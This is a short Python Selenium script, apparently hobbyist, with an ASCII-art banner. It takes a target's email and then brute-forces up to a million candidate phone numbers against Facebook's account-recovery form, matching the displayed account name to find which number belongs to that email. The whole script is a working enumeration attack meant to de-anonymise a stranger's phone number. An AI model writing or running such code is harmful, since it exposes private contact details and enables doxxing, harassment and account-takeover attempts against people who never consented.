from selenium import webdriver
import time


print(" <=====================================================>   ")
print("")
print("")
print("          ***          **********          ***             ")
print("       *****           **********           *****          ")
print("     *******           **********           *******        ")
print("   **********         ************         **********      ")
print("  ****************************************************     ")
print(" ******************************************************    ")
print("********************************************************   ")
print("********************************************************   ")
print("********************************************************   ")
print(" ******************************************************    ")
print("  ********      ************************      ********     ")
print("   *******       *     *********      *       *******      ")
print("     ******             *******              ******        ")
print("       *****             *****              *****          ")
print("          ***             ***              ***             ")
print("            **             *              **               ")
print("")
print("")
print(" <============= created by Abdullah Shokr =============>   ")
print("            <============Hello============>                ")
first = input("what is the first:")
g= input("what is last number :")
print("============created by Abdullah Shokr================")

usr = input('Enter your email id: ')
url = 'https://www.facebook.com/login/identify/?ctx=recover'
driver = webdriver.Chrome(executable_path = 'chromedriver' )
driver.get(url)

username_box = driver.find_element_by_id('identify_email')
username_box.send_keys(usr)

driver.find_element_by_id('did_submit').click()
time.sleep(1)
x = driver.find_element_by_class_name('fcb').text
print(x)

for a in range(0, 10):
    for b in range(0, 10):
        for c in range(0, 10):
            for d in range(0, 10):
                for e in range(0, 10):
                    for f in range(0, 10):
                        number = (str(first) + str(a) + str(b)+ str(c) + str(d) + str(e) + str(f) + str(g))
                        url = 'https://www.facebook.com/login/identify/?ctx=recover'
                        driver = webdriver.Chrome(executable_path = 'C:/Users/dell/Downloads/chromedriver' )
                        driver.get(url)

                        username_box = driver.find_element_by_id('identify_email')
                        username_box.send_keys(number)

                        driver.find_element_by_id('did_submit').click()
    
                        time.sleep(1)
                        


                        error = driver.find_element_by_class_name("uiHeaderTitle").text 
                        test = "Enter Security Code"
                        testo = "Account disabled"
                        noacc = "Find Your Account"
                        
                        if error == test :

                            print(number + " >>> Erorr")

                            
                        elif error == testo :

                            print(number + " >>> Erorr_Two")
        
                        elif error == noacc :

                            print(number + " >>> no Account")
                            
                        else :
                            y = driver.find_element_by_class_name('fcb').text
                            if x == y :
                                print("This is the number: "+number)                                                            
                            else:
                                print(number + " >>> Not found")



